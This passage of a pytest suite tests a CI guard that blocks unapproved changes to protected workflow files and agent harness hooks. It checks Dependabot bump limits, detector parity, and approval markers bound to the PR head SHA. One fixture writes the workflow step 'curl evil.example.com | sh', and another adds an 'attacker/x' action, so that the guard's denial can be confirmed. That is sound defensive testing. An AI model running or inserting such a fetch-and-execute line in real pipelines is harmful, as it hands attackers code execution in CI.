        check allowed it, on `.github/workflows/` — where `id-token: write` and
        the PyPI trusted-publisher relationship live. It never violated the
        stated trust boundary (`GITHUB_ACTOR`), but it was wider than
        `dependabot_action_bump_allowed`'s own name and docstring claim.
        """
        _commit(fresh_repo, ".github/workflows/test.yml",
                "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@aaaa1111\n", "seed")
        self._bump(fresh_repo, f"jobs:\n  a:\n    steps:\n{swapped_line}\n")
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": "pull_request", "GITHUB_ACTOR": self._BOT,
            "PR_TITLE": "Bump actions/checkout from 4.2.1 to 4.2.2",
        })
        assert result.returncode == 2, f"{label} was allowed:\n{result.stdout}"

    def test_dependabot_appending_a_new_uses_line_denies(self, fresh_repo):
        """An ADDED action with no matching removal is not a bump.

        Distinct shape from the swap above: the original line is untouched, so
        the diff has an addition and no removal. An identity check that only
        compared line-for-line, or that tolerated an empty removal side, would
        let this through.
        """
        _commit(fresh_repo, ".github/workflows/test.yml",
                "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@aaaa1111\n", "seed")
        self._bump(
            fresh_repo,
            "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@aaaa1111\n"
            "      - uses: attacker/x@cccc3333\n",
        )
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": "pull_request", "GITHUB_ACTOR": self._BOT,
            "PR_TITLE": "Bump actions/checkout from 4.2.1 to 4.2.2",
        })
        assert result.returncode == 2, result.stdout

    def test_dependabot_bump_alongside_an_unrelated_file_denies(self, fresh_repo):
        """Condition 2 sees EVERY changed path, not just the protected ones."""
        _commit(fresh_repo, ".github/workflows/test.yml",
                "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@aaaa1111\n", "seed")
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        (fresh_repo / ".github" / "workflows" / "test.yml").write_text(
            "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@bbbb2222\n", encoding="utf-8")
        (fresh_repo / "hitchhiker.py").write_text("import os\n", encoding="utf-8")
        _git(["add", "-A"], fresh_repo, _git_env())
        _git(["commit", "-m", "Bump actions/checkout from 4.2.1 to 4.2.2"], fresh_repo, _git_env())
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": "pull_request", "GITHUB_ACTOR": self._BOT,
            "PR_TITLE": "Bump actions/checkout from 4.2.1 to 4.2.2",
        })
        assert result.returncode == 2, result.stdout

    def test_dependabot_changing_a_non_uses_line_denies(self, fresh_repo):
        """Diff-shape arm: a workflow edit that is not purely a `uses:` bump."""
        _commit(fresh_repo, ".github/workflows/test.yml",
                "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@aaaa1111\n", "seed")
        self._bump(fresh_repo,
                   "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@bbbb2222\n"
                   "      - run: curl evil.example.com | sh\n")
        result = _run_guard(fresh_repo, {
            "GITHUB_EVENT_NAME": "pull_request", "GITHUB_ACTOR": self._BOT,
            "PR_TITLE": "Bump actions/checkout from 4.2.1 to 4.2.2",
        })
        assert result.returncode == 2, result.stdout


class TestSelfHostFingerprintMirrorParity:
    """ci_guard duplicates the SHA pin (zero sibling imports); pin the copies.

    Same shape as TestGovernanceMirrorParity above and as
    tests/test_forced_copy_parity.py::TestSettingsCandidatesParity — the repo's
    established answer to "duplicate rather than cross-import".
    """

    def _load_ci_guard(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location("_ci_guard_fp", CI_GUARD)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod

    def test_sha_pin_matches_both_sots(self):
        from espalier import _self_host_fingerprint as engine_fp
        mod = self._load_ci_guard()
        assert mod._CI_WRITE_GUARD_PREFIX_SHA256 == engine_fp.WRITE_GUARD_PREFIX_SHA256, (
            "ci_guard's inline write_guard SHA pin drifted from "
            "espalier._self_host_fingerprint — refresh both in the same change."
        )
        assert mod._CI_WRITE_GUARD_PREFIX_BYTES == engine_fp.WRITE_GUARD_PREFIX_BYTES

    @contextlib.contextmanager
    def _hook_twin(self):
        """Load `_hook_utils` with the hooks dir on sys.path FOR THE WHOLE BLOCK.

        Not just for exec_module: `_write_guard_prefix_matches_pin` does
        `import _self_host_fingerprint` LAZILY, inside the call. Popping the
        path straight after exec makes that import fail, the helper returns
        False, and the twin reports "not self-host" for reasons that have
        nothing to do with the repo — a harness artifact that reads exactly
        like a real divergence. In production the hook's own directory is
        sys.path[0], so the lazy import resolves; only this loader had to
        arrange it. (Found by this very test: it failed in isolation and
        passed inside the module, because an earlier test had already left
        `_self_host_fingerprint` in sys.modules.)
        """
        import importlib.util
        hooks_dir = str(ROOT / "tools" / "cc" / "hooks")
        spec = importlib.util.spec_from_file_location(
            "_hook_utils_fp", ROOT / "tools" / "cc" / "hooks" / "_hook_utils.py"
        )
        hook_mod = importlib.util.module_from_spec(spec)
        sys.path.insert(0, hooks_dir)
        # Drop a cached copy so the lazy import resolves against THIS path
        # rather than whatever an earlier test left behind.
        cached = sys.modules.pop("_self_host_fingerprint", None)
        try:
            spec.loader.exec_module(hook_mod)
            yield hook_mod
        finally:
            sys.modules.pop("_self_host_fingerprint", None)
            if cached is not None:
                sys.modules["_self_host_fingerprint"] = cached
            if hooks_dir in sys.path:
                sys.path.remove(hooks_dir)

    def test_detector_agrees_with_the_hook_twin_across_inputs(self, tmp_path):
        """Behavioural parity on TRUE-producing AND FALSE-producing inputs.

        The first version of this test asserted only that both detectors call
        the live checkout self-host. That is one input on which both return
        True, so it could not observe a divergence in the direction divergence
        actually happens — a born-weak parity test, and the reason a real
        encoding split between the two copies went unnoticed. Each case below
        is chosen to break a DIFFERENT signal, so the two implementations are
        compared where they can disagree.
        """
        mod = self._load_ci_guard()
        cases: list[tuple[str, Path, bool]] = [("live checkout", ROOT, True)]

        # signal 5 broken: right name and dirs, wrong write_guard bytes
        wrong_sha = tmp_path / "wrong_sha"
        (wrong_sha / "tools" / "cc" / "hooks").mkdir(parents=True)
        (wrong_sha / "espalier").mkdir()
        (wrong_sha / "bench").mkdir()
        (wrong_sha / "pyproject.toml").write_text(_SELF_HOST_PYPROJECT, encoding="utf-8")
        (wrong_sha / "tools" / "cc" / "hooks" / "write_guard.py").write_text("# nope\n", encoding="utf-8")
        cases.append(("signal 5 broken", wrong_sha, False))

        # signal 4 broken: an adopter's name
        wrong_name = tmp_path / "wrong_name"
        (wrong_name / "tools" / "cc" / "hooks").mkdir(parents=True)
        (wrong_name / "espalier").mkdir()
        (wrong_name / "bench").mkdir()
        (wrong_name / "pyproject.toml").write_text('[project]\nname = "someone-else"\n', encoding="utf-8")
        (wrong_name / "tools" / "cc" / "hooks" / "write_guard.py").write_bytes(
            (ROOT / "tools" / "cc" / "hooks" / "write_guard.py").read_bytes()
        )
        cases.append(("signal 4 broken", wrong_name, False))

        # undecodable pyproject — the input that split the two copies
        utf16 = tmp_path / "utf16"
        (utf16 / "tools" / "cc" / "hooks").mkdir(parents=True)
        (utf16 / "espalier").mkdir()
        (utf16 / "bench").mkdir()
        (utf16 / "pyproject.toml").write_bytes(_SELF_HOST_PYPROJECT.encode("utf-16"))
        (utf16 / "tools" / "cc" / "hooks" / "write_guard.py").write_bytes(
            (ROOT / "tools" / "cc" / "hooks" / "write_guard.py").read_bytes()
        )
        cases.append(("undecodable pyproject", utf16, False))

        # bare directory — nothing present
        cases.append(("empty tree", tmp_path / "nonexistent", False))

        with self._hook_twin() as hook_mod:
            for label, root, expected in cases:
                ci_says = mod._ci_is_self_host_repo(root)
                hook_says = hook_mod.is_self_host_repo(root)
                assert ci_says == hook_says, (
                    f"[{label}] ci_guard says {ci_says}, hook twin says "
                    f"{hook_says} — the duplicated detectors have diverged"
                )
                assert ci_says is expected, (
                    f"[{label}] expected {expected}, got {ci_says}"
                )


def test_doctor_ci_scan_parity_on_a_voided_settings_file(tmp_path):
    """The parity lock must hold on the VOIDED shape, not just the malformed ones.

    ⚠ This row exists because the lock broke here and nothing caught it. The
    whole-file `type` voiding summary was added to ci_guard's `findings` and to
    doctor's `next_steps` -- two lists, only one of them count-parity-pinned --
    so doctor reported 4 and ci_guard 5 on the same tree. That is the
    "doctor closed, ci open" one-directional drift the sibling parity row was
    written to end, reintroduced on a new shape one list over.

    The existing `test_doctor_ci_scan_parity_on_malformed_settings` fixtures
    ({"hooks": "x"}, {"hooks": []}, {"hooks": null}, [], bad JSON, {"hooks": {}})
    can NEVER produce a voiding entry, so it stayed green throughout. A fixture
    set that cannot construct the failing shape is not coverage of it.
    """
    import importlib.util
    import json
    import subprocess
    import sys

    from espalier import doctor

    repo = tmp_path / "target"
    repo.mkdir()
    (repo / "README.md").write_text("# t\n", encoding="utf-8")
    subprocess.check_call(["git", "init", "--quiet"], cwd=str(repo))
    subprocess.run([sys.executable, "-m", "espalier.cli", "init", str(repo)],
                   capture_output=True, text=True, timeout=300, encoding="utf-8")

    settings = repo / ".claude" / "settings.json"
    data = json.loads(settings.read_text(encoding="utf-8"))
    # An adopter's OWN hook, under an event espalier does not gate, with no
    # `type`. Espalier's twelve entries are untouched and all correct.
    data["hooks"].setdefault("PostToolUse", []).append(
        {"hooks": [{"command": "python3", "args": ["my_own_hook.py"]}]}
    )
    settings.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")

    spec = importlib.util.spec_from_file_location(
        "_ci_guard_voided_parity",
        Path(__file__).resolve().parent.parent / "tools/cc/ci_guard.py")
    cig = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(cig)

    doctor_failures = doctor._check_governance_event_wiring(repo)
    ci_findings = cig._scan_settings_for_missing_governance_events(
        ".claude/settings.json", repo)

    assert len(doctor_failures) == len(ci_findings), (
        "doctor and ci_guard disagree on how many governance failures a voided "
        f"settings.json has: doctor={len(doctor_failures)} "
        f"ci={len(ci_findings)}\n  doctor: {doctor_failures}\n  ci: {ci_findings}"
    )
    assert doctor_failures, "a voided settings.json must not read as healthy"
    # And the CAUSE must lead, on both surfaces: every per-gate line is true and
    # unactionable here, and the offending entry is not one espalier manages.
    assert "type" in doctor_failures[0], (
        "doctor's headline failure does not name the `type` that voided the "
        f"file, so `primary_reason` sends the operator to re-wire correct "
        f"wiring: {doctor_failures[0]!r}"
    )
    assert "type" in ci_findings[0], (
        f"ci_guard's first finding does not name the cause: {ci_findings[0]!r}"
    )


# ── DEF-338: approval is bound to the reviewed head, not to the PR ──────────


def _head(repo: Path) -> str:
    return _git(["rev-parse", "HEAD"], repo).stdout.strip()


class TestApprovalBoundToHead:
    """DEF-338. On a pull request the marker lives in the title, which a
    force-push cannot edit (BC-032) -- but the title approved the PR, not a
    commit. A reviewer approved head A, the author force-pushed head B with a
    brand-new protected-zone change, the gate re-ran, the title still carried
    the marker, green. Now the title must carry ``HARNESS-UPDATE-APPROVED@<sha>``
    where the sha (7 to 40 hex, any case) is a prefix of the head the workflow
    forwards as ``PR_HEAD_SHA``. A force-push changes the head, so the same
    title goes red and the message names the new head to re-approve. The bare
    marker on a PR is the residual itself and is refused with the paste-ready
    fragment. A PR event that arrives without ``PR_HEAD_SHA`` fails closed and
    names the remedy, since the script and the workflow deploy together. Push
    events keep reading the commit message: it travels with its commit, and
    the posture rule already governs that path.
    """

    PR_LIKE_EVENTS = ["pull_request", "pull_request_target", "merge_group"]

    @staticmethod
    def _touch(repo: Path, msg: str = "hook update") -> str:
        _commit(repo, "tools/cc/hooks/write_guard.py", f"x = {msg!r}\n", msg)
        return _head(repo)

    @staticmethod
    def _pr(repo: Path, title: str, head: str | None, event: str = "pull_request"):
        env = {"GITHUB_EVENT_NAME": event, "PR_TITLE": title}
        if head is not None:
            env["PR_HEAD_SHA"] = head
        return _run_guard(repo, env)

    @pytest.mark.parametrize("event", PR_LIKE_EVENTS)
    def test_a_title_bound_to_the_head_allows(self, event, fresh_repo):
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        head = self._touch(fresh_repo)
        result = self._pr(fresh_repo, f"HARNESS-UPDATE-APPROVED@{head[:7]}: legit", head, event)
        assert result.returncode == 0, result.stdout
        assert "approval marker present" in result.stdout

    @pytest.mark.parametrize("spell", ["full", "upper", "twelve", "trailing-colon"])
    def test_a_full_uppercase_or_longer_prefix_allows(self, spell, fresh_repo):
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        head = self._touch(fresh_repo)
        sha = {
            "full": head, "upper": head[:7].upper(), "twelve": head[:12],
            "trailing-colon": head[:7],
        }[spell]
        title = f"fix: HARNESS-UPDATE-APPROVED@{sha}" + (":" if spell == "trailing-colon" else "")
        assert self._pr(fresh_repo, title, head).returncode == 0

    def test_a_force_push_after_approval_denies_and_names_both_heads(self, fresh_repo):
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        approved = self._touch(fresh_repo, "reviewed change")
        title = f"HARNESS-UPDATE-APPROVED@{approved[:7]}: reviewed"
        assert self._pr(fresh_repo, title, approved).returncode == 0
        # The author pushes a NEW protected-zone change; the title is unchanged.
        new_head = self._touch(fresh_repo, "slipped in after review")
        assert new_head != approved
        result = self._pr(fresh_repo, title, new_head)
        assert result.returncode == 2, result.stdout
        assert new_head[:7] in result.stdout, "the head to re-approve must be on screen"
        assert approved[:7] in result.stdout, "the head the title approved must be on screen"
        assert "force-push" in result.stdout
        assert f"HARNESS-UPDATE-APPROVED@{new_head[:7]}" in result.stdout

    def test_a_bare_marker_on_a_pull_request_is_refused_with_the_fragment(self, fresh_repo):
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        head = self._touch(fresh_repo)
        result = self._pr(fresh_repo, "HARNESS-UPDATE-APPROVED: legit", head)
        assert result.returncode == 2, result.stdout
        assert f"HARNESS-UPDATE-APPROVED@{head[:7]}" in result.stdout

    def test_a_pull_request_with_no_marker_names_the_fragment_to_add(self, fresh_repo):
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        head = self._touch(fresh_repo)
        result = self._pr(fresh_repo, "Innocuous title", head)
        assert result.returncode == 2, result.stdout
        assert f"HARNESS-UPDATE-APPROVED@{head[:7]}" in result.stdout
        assert "PULL REQUEST TITLE" in result.stdout

    def test_a_sha_that_is_not_a_prefix_of_the_head_denies(self, fresh_repo):
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        head = self._touch(fresh_repo)
        result = self._pr(fresh_repo, "HARNESS-UPDATE-APPROVED@0000000: typo", head)
        assert result.returncode == 2, result.stdout
        assert "0000000" in result.stdout and head[:7] in result.stdout

    def test_a_hex_run_shorter_than_seven_is_no_binding(self, fresh_repo):
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        head = self._touch(fresh_repo)
        result = self._pr(fresh_repo, f"HARNESS-UPDATE-APPROVED@{head[:5]}: short", head)
        assert result.returncode == 2, result.stdout
        # The unbound branch, not the mismatch branch: a short run is no binding.
        assert "without the head is refused" in result.stdout

    def test_a_missing_pr_head_sha_fails_closed_naming_the_remedy(self, fresh_repo):
        """The remedy is paste-ready and names the parked workflow: install-ci
        never overwrites a differing workflow, it writes `.new`, so 'run
        install-ci' alone would send an upgrading adopter in a loop; and the
        obvious hand-edit, `github.sha`, is the merge commit on a pull
        request, not the head."""
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        head = self._touch(fresh_repo)
        result = self._pr(fresh_repo, f"HARNESS-UPDATE-APPROVED@{head[:7]}: legit", head=None)
        assert result.returncode == 2, result.stdout
        assert "PR_HEAD_SHA" in result.stdout and "install-ci" in result.stdout
        assert "github.event.pull_request.head.sha" in result.stdout
        assert "harness-guard.yml.new" in result.stdout
        assert "github.sha" in result.stdout

    @pytest.mark.parametrize("head", ["junk", "abc", "0123456g"])
    def test_a_malformed_pr_head_sha_is_treated_as_missing(self, head, fresh_repo):
        """Not reachable from a real event, but the message must never offer a
        fragment no binding could match."""
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        self._touch(fresh_repo)
        result = self._pr(fresh_repo, "HARNESS-UPDATE-APPROVED@abcdef0: x", head)
        assert result.returncode == 2, result.stdout
        assert "PR_HEAD_SHA" in result.stdout
        assert f"HARNESS-UPDATE-APPROVED@{head[:7]}" not in result.stdout

    def test_a_title_with_a_stale_and_a_fresh_binding_allows(self, fresh_repo):
        """A reviewer who APPENDS the re-binding after a force-push rather than
        replacing the stale one has still bound the new head; the gate reads
        every binding, in either order. Stale alone still denies."""
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        old = self._touch(fresh_repo, "reviewed")
        new = self._touch(fresh_repo, "after review")
        both = f"HARNESS-UPDATE-APPROVED@{old[:7]} re-approved HARNESS-UPDATE-APPROVED@{new[:7]}"
        assert self._pr(fresh_repo, both, new).returncode == 0
        reversed_ = f"HARNESS-UPDATE-APPROVED@{new[:7]} was HARNESS-UPDATE-APPROVED@{old[:7]}"
        assert self._pr(fresh_repo, reversed_, new).returncode == 0
        stale = self._pr(fresh_repo, f"HARNESS-UPDATE-APPROVED@{old[:7]} only", new)
        assert stale.returncode == 2, stale.stdout
        assert old[:7] in stale.stdout and new[:7] in stale.stdout

    def test_a_blank_pr_head_sha_is_missing_too(self, fresh_repo):
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        head = self._touch(fresh_repo)
        result = self._pr(fresh_repo, f"HARNESS-UPDATE-APPROVED@{head[:7]}: legit", head="  ")
        assert result.returncode == 2, result.stdout
        assert "PR_HEAD_SHA" in result.stdout

    def test_push_keeps_reading_the_commit_message_and_ignores_the_head_env(self, fresh_repo):
        """Unchanged by design: on a direct push the marker travels with its
        commit, the pusher already holds write access, and the posture rule
        governs the path. A bound spelling in a commit message is a marker too."""
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        _commit(fresh_repo, "tools/cc/hooks/write_guard.py", "x = 1\n",
                "HARNESS-UPDATE-APPROVED: direct fix")
        result = _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push", "PR_HEAD_SHA": "0000000"})
        assert result.returncode == 0, result.stdout
        _commit(fresh_repo, "tools/cc/hooks/write_guard.py", "x = 2\n",
                "HARNESS-UPDATE-APPROVED@abcdef0: bound spelling in a commit message")
        assert _run_guard(fresh_repo, {"GITHUB_EVENT_NAME": "push"}).returncode == 0

    @pytest.mark.parametrize("event", ["workflow_dispatch", "schedule", ""])
    def test_no_review_context_events_still_refuse_a_bound_marker(self, event, fresh_repo):
        _git(["checkout", "-b", "feature"], fresh_repo, _git_env())
        head = self._touch(fresh_repo)
        result = self._pr(fresh_repo, f"HARNESS-UPDATE-APPROVED@{head[:7]}", head, event)
        assert result.returncode == 2, result.stdout

    def test_the_workflow_asset_forwards_the_pull_request_head(self):
        """The asset is the source of truth for the root workflow (the inverted
        mirror row); both must forward the head the gate binds to."""
        asset = (ROOT / "espalier" / "assets" / "github" / "workflows" / "harness-guard.yml")
        root = ROOT / ".github" / "workflows" / "harness-guard.yml"
        for path in (asset, root):
            text = path.read_text(encoding="utf-8")
            assert "PR_HEAD_SHA:" in text, path
            assert "github.event.pull_request.head.sha" in text, path


def _ci_guard_module():
    """Load tools/cc/ci_guard.py in-process via spec_from_file_location, never
    a plain import, so espalier is not dragged into its zero-import graph."""
    import importlib.util
    spec = importlib.util.spec_from_file_location("_ci_guard_under_test", CI_GUARD)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


_HEX40 = "0123456789abcdef" * 2 + "01234567"  # 40 hex chars


class TestBoundMarkerParser:
    """The rejection set of `approved_shas`, pinned as a table (DEF-338 review):
    a 41-hex run is no binding (fail-closed), a run glued to a letter is no
    binding, a run ended by `_` or `-` IS one (the tail stops at anything that
    is not a letter or digit), and every binding in a title is read."""

    @pytest.mark.parametrize("title, expected", [
        ("HARNESS-UPDATE-APPROVED: legit", []),
        ("HARNESS-UPDATE-APPROVED", []),
        ("HARNESS-UPDATE-APPROVED@abc1234", ["abc1234"]),
        ("HARNESS-UPDATE-APPROVED@ABC1234: legit", ["abc1234"]),
        ("fix: HARNESS-UPDATE-APPROVED@abc1234", ["abc1234"]),
        ("HARNESS-UPDATE-APPROVED@" + _HEX40, [_HEX40]),
        ("HARNESS-UPDATE-APPROVED@" + _HEX40 + "0", []),
        ("HARNESS-UPDATE-APPROVED@abc1234x", []),
        ("HARNESS-UPDATE-APPROVED@abc123", []),
        ("HARNESS-UPDATE-APPROVED@abc1234_more", ["abc1234"]),
        ("HARNESS-UPDATE-APPROVED@abc1234-more", ["abc1234"]),
        ("HARNESS-UPDATE-APPROVED@ abc1234", []),
        ("HARNESS-UPDATE-APPROVED@1111111 re-approved HARNESS-UPDATE-APPROVED@abcdef0",
         ["1111111", "abcdef0"]),
    ])
    def test_approved_shas_table(self, title, expected):
        mod = _ci_guard_module()
        assert mod.approved_shas(title) == expected
        assert mod.approved_sha(title) == (expected[0] if expected else None)

    @pytest.mark.parametrize("raw, expected", [
        ("ABCDEF0123", "abcdef0123"),
        ("  abcdef0  ", "abcdef0"),
        ("", ""),
        ("   ", ""),
        ("abc", ""),
        ("junk", ""),
        ("0123456g", ""),
    ])
    def test_pr_head_sha_normalises_and_rejects_non_commits(self, raw, expected):
        mod = _ci_guard_module()
        assert mod.pr_head_sha({"PR_HEAD_SHA": raw}) == expected
        assert mod.pr_head_sha({}) == ""


class TestWorkflowAssetForwardsEveryGateInput:
    """The asset's env block claims to be the complete declaration of the
    script's inputs. DEF-338 showed the blast radius of one missing key: every
    protected pull request fails closed. Derive the keys the gate reads and
    assert the asset forwards each one, so the claim is a check and not a
    comment (STANDING_PRINCIPLES 14)."""

    ASSET = ROOT / "espalier" / "assets" / "github" / "workflows" / "harness-guard.yml"

    @staticmethod
    def _asset_env_keys(text: str) -> set[str]:
        import re as _re
        step = text.split("Check protected paths", 1)[1]
        block = step.split("run:", 1)[0]
        return set(_re.findall(r"^\s+([A-Z_]+):", block, flags=_re.MULTILINE))

    def test_every_env_key_the_gate_reads_is_forwarded(self):
        import re as _re
        source = CI_GUARD.read_text(encoding="utf-8")
        read = set(_re.findall(r'env\.get\("([A-Z_]+)"', source))
        assert read, "the derivation found no env reads; the regex is wrong, not the gate"
        forwarded = self._asset_env_keys(self.ASSET.read_text(encoding="utf-8"))
        missing = sorted(read - forwarded)
        assert not missing, (
            f"ci_guard reads {missing} but the workflow asset's 'Check protected "
            f"paths' env block does not forward it/them -- add the forward to "
            f"{self.ASSET.relative_to(ROOT)} and re-run scripts/sync_github_workflow_asset.py"
        )

    def test_the_root_workflow_matches_the_asset_on_env_keys(self):
        root = ROOT / ".github" / "workflows" / "harness-guard.yml"
        assert self._asset_env_keys(root.read_text(encoding="utf-8")) == self._asset_env_keys(
            self.ASSET.read_text(encoding="utf-8")
        )

    def test_the_pull_request_trigger_includes_edited(self):
        """The bound marker's recovery is a title edit, which GitHub does not
        run on by default (opened, synchronize, reopened). Without `edited`
        the red after a force-push could never clear: a push to force a run
        moves the head again."""
        for path in (self.ASSET, ROOT / ".github" / "workflows" / "harness-guard.yml"):
            text = path.read_text(encoding="utf-8")
            on_block = text.split("\njobs:", 1)[0]
            assert "types: [opened, synchronize, reopened, edited]" in on_block, path


class TestInstallCiNamesTheMissingForward:
    """install-ci never overwrites a workflow that differs from its own; it parks
    `.new`. An adopter upgrading from before the binding gets the new script
    and keeps the old workflow, so every protected pull request fails closed.
    The WARN must name the missing key and the line, or the adopter loops on
    a remedy that parks the fix again."""

    def test_warn_names_pr_head_sha_when_the_host_workflow_lacks_it(self, tmp_path):
        asset = (ROOT / "espalier" / "assets" / "github" / "workflows" / "harness-guard.yml")
        old = "\n".join(
            line for line in asset.read_text(encoding="utf-8").splitlines()
            if "PR_HEAD_SHA" not in line
        ) + "\n"
        dst = tmp_path / ".github" / "workflows" / "harness-guard.yml"
        dst.parent.mkdir(parents=True)
        dst.write_text(old, encoding="utf-8")
        result = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=60, cwd=str(ROOT), encoding="utf-8",
        )
        assert result.returncode == 0, result.stderr
        assert (dst.parent / "harness-guard.yml.new").exists()
        assert "PR_HEAD_SHA" in result.stderr, result.stderr
        assert "github.event.pull_request.head.sha" in result.stderr
        assert "PR_HEAD_SHA" not in dst.read_text(encoding="utf-8"), "the host copy is left alone"

    def test_a_latin1_host_workflow_still_gets_the_warn_not_a_traceback(self, tmp_path):
        """Ledger DEF-829: the host's workflow re-saved in a Windows code page.
        ``UnicodeDecodeError`` is a ``ValueError``, so the ``except OSError``
        around the two strict reads let it past and install-ci died with a
        traceback right after parking the fix. The texts are sentences
        searched for one key: read with a replacement character, the warn
        still fires."""
        asset = (ROOT / "espalier" / "assets" / "github" / "workflows" / "harness-guard.yml")
        dst = tmp_path / ".github" / "workflows" / "harness-guard.yml"
        dst.parent.mkdir(parents=True)
        dst.write_bytes(
            asset.read_bytes().replace(b"PR_HEAD_SHA:", b"PR_HEAD_SHX:") + b"# caf\xe9\n"
        )
        result = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=60, cwd=str(ROOT), encoding="utf-8",
        )
        assert result.returncode == 0, result.stderr
        assert "does not forward PR_HEAD_SHA" in result.stderr

    def test_no_extra_warn_when_the_host_workflow_forwards_it(self, tmp_path):
        asset = (ROOT / "espalier" / "assets" / "github" / "workflows" / "harness-guard.yml")
        dst = tmp_path / ".github" / "workflows" / "harness-guard.yml"
        dst.parent.mkdir(parents=True)
        # Differs from the asset (a trailing comment) but forwards the key.
        dst.write_text(asset.read_text(encoding="utf-8") + "# host note\n", encoding="utf-8")
        result = subprocess.run(
            [sys.executable, "-m", "espalier.cli", "install-ci", str(tmp_path)],
            capture_output=True, text=True, timeout=60, cwd=str(ROOT), encoding="utf-8",
        )
        assert result.returncode == 0, result.stderr
        assert "does not forward PR_HEAD_SHA" not in result.stderr
